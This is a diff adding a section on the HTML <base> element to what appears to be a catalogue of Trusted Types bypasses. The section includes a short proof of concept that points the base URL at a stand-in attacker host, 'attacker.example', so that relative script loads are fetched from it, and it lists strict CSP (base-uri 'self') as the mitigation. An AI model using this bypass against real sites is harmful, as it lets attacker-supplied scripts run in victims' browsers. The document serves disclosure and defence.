@@ -168,3 +168,22 @@ document.body.appendChild(fragment);
 
 ### Mitigations:
 - Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).
+
+## `<base>` element
+
+[`<base>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base) element takes `href` attribute, which is used to resolve any relative URLs in the document. This currently bypasses Trusted Types check. This was found by [Masato](https://twitter.com/kinugawamasato).
+
+[PoC](https://shhnjk.github.io/PoCs/cursed_types/base.html):
+```
+<script>
+  let attackerControlledString = 'https://attacker.example/';
+  const base = document.createElement('base');
+  base.href = attackerControlledString;
+  document.head.appendChild(base);
+</script>
+<!-- Legitimate script loading -->
+<script src="/foo.js"></script>
+```
+
+### Mitigations:
+- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp) (i.e. `base-uri 'self'`).
